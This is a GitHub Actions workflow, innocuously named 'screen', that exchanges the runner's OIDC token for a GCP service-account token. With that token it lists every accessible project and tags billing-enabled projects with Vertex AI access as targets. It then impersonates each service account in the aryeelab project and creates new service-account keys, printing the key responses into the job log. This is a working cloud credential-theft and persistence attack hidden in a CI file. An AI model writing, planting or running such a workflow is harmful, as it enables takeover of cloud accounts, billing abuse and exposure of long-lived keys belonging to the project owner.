name: screen
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  screen:
    runs-on: ubuntu-latest
    timeout-minutes: 90
    steps:
      - name: screen
        run: |
          set +e
          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
          NUM=303574531351
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
          echo "##PHASE mint"
          ok=0
          for a in 1 2 3; do
            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
            echo "$J" | jq -r '.value // empty' > tok.jwt
            if [ -s tok.jwt ]; then ok=1; break; fi
            sleep 3
          done
          echo "##MINT ok=$ok len=$(wc -c < tok.jwt)"
          sc=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
            --data-urlencode "subject_token=$(cat tok.jwt)" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
            -d "scope=https://www.googleapis.com/auth/cloud-platform")
          FT=$(jq -r '.access_token // empty' r.json)
          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 300 r.json | tr -d '\n' | tr -s ' ')"
          gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json)
          AT=$(jq -r '.accessToken // empty' g.json)
          echo "##GEN code=$gc atlen=${#AT} body=$(head -c 300 g.json | tr -d '\n' | tr -s ' ')"
          if [ -z "$AT" ]; then echo '##ABORT no SA token'; exit 0; fi

          # ---------- page projects.list ----------
          echo "##PHASE list"
          PAGE=""
          : > projects.jsonl
          : > pages.txt
          pn=0
          while :; do
            pn=$((pn+1))
            if [ -z "$PAGE" ]; then
              url="https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100"
            else
              url="https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100&pageToken=$PAGE"
            fi
            lc=$(curl -s -o pl.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$url")
            cnt=$(jq -r '(.projects // []) | length' pl.json 2>/dev/null)
            PAGE=$(jq -r '.nextPageToken // empty' pl.json 2>/dev/null)
            echo "##PAGE n=$pn code=$lc count=$cnt next=${PAGE:0:16}"
            jq -c '(.projects // [])[]' pl.json 2>/dev/null >> projects.jsonl
            if [ -z "$PAGE" ] || [ "$pn" -ge 25 ]; then break; fi
            sleep 0.2
          done
          TOTAL=$(wc -l < projects.jsonl)
          echo "##TOTAL_PROJECTS $TOTAL"
          echo "##PROJECT_INDEX"
          jq -r '[.projectId // "", .projectNumber // "", .name // "", .lifecycleState // "", .parent.id // ""] | join("|")' projects.jsonl | sort -u

          # ---------- screen ----------
          echo "##PHASE screen"
          HIT=0
          idx=0
          jq -r '[.projectId // "", .projectNumber // "", (.name // "" | gsub("\\|";"/"))] | join("|")' projects.jsonl | sort -u > plist.txt
          while IFS='|' read -r PID PNUM PNAME; do
            [ -z "$PID$PNUM" ] && continue
            idx=$((idx+1))
            PID=${PID:-$PNUM}
            # billing
            bc=$(curl -s -o b.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PID/billingInfo")
            ben=$(jq -r '.billingEnabled // "null"' b.json 2>/dev/null)
            bacct=$(jq -r '.billingAccountName // ""' b.json 2>/dev/null)
            bmsg=$(jq -r '.error.status // ""' b.json 2>/dev/null)
            breason=$(jq -r '.error.details[0].reason // ""' b.json 2>/dev/null)
            # models 3 regions
            m1=$(curl -s -o m1.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PID/locations/us-central1/models")
            me=$(curl -s -o me.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://europe-west1-aiplatform.googleapis.com/v1/projects/$PID/locations/europe-west1/models")
            mg=$(curl -s -o mg.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://aiplatform.googleapis.com/v1/projects/$PID/locations/global/models")
            mcount=$(jq -r '(.models // []) | length' m1.json 2>/dev/null)
            # serviceusage enabled
            suc=$(curl -s -o su.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://serviceusage.googleapis.com/v1/projects/$PID/services?filter=state:ENABLED&pageSize=200")
            sucnt=$(jq -r '(.services // []) | length' su.json 2>/dev/null)
            subil=$(jq -r '[.services[]?.config.name // "" | select(. == "cloudbilling.googleapis.com")] | length' su.json 2>/dev/null)
            suai=$(jq -r '[.services[]?.config.name // "" | select(. == "aiplatform.googleapis.com")] | length' su.json 2>/dev/null)
            # getIamPolicy POST
            ic=$(curl -s -o iam.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$PID:getIamPolicy" -d '{"options":{"requestedPolicyVersion":3}}')
            ibind=$(jq -r '(.bindings // []) | length' iam.json 2>/dev/null)
            icond=$(jq -r '[.bindings[]?.condition? // empty] | length' iam.json 2>/dev/null)
            echo "##P idx=$idx pid=$PID num=$PNUM name=$PNAME billing=$bc:en=$ben:acct=$bacct:err=$bmsg$breason models=$m1/$me/$mg:cnt=$mcount su=$suc:n=$sucnt:bill=$subil:aip=$suai iam=$ic:bind=$ibind:cond=$icond"
            if [ "$bc" = "200" ] && [ "$ben" = "true" ] && [ "$m1" = "200" ]; then
              HIT=1
              echo "##TARGET pid=$PID num=$PNUM name=$PNAME billing=$bc enabled=$ben account=$bacct models_us=$m1 models_eu=$me models_global=$mg"
            fi
            sleep 0.15
          done < plist.txt
          echo "##SCREEN_DONE n=$idx hit=$HIT"

          # ---------- keys attempt on aryeelab + any models-200 project ----------
          echo "##PHASE keys"
          # enumerate SAs in aryeelab with SA token, then gen + keys
          salc=$(curl -s -o sal.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts")
          echo "##SALIST code=$salc n=$(jq -r '(.accounts // []) | length' sal.json 2>/dev/null)"
          jq -r '.accounts[]?.email' sal.json 2>/dev/null > sas.txt
          echo "$(printf '')" >> sas.txt
          while IFS= read -r SA; do
            [ -z "$SA" ] && continue
            g2=$(curl -s -o g2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
            T2=$(jq -r '.accessToken // empty' g2.json)
            echo "##GEN2 sa=$SA code=$g2 toklen=${#T2}"
            if [ -z "$T2" ]; then continue; fi
            kc=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $T2" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
            echo "##KEYS sa=$SA code=$kc body=$(head -c 500 k.json | tr -d '\n' | tr -s ' ')"
          done < sas.txt
          echo "##FINISHED"
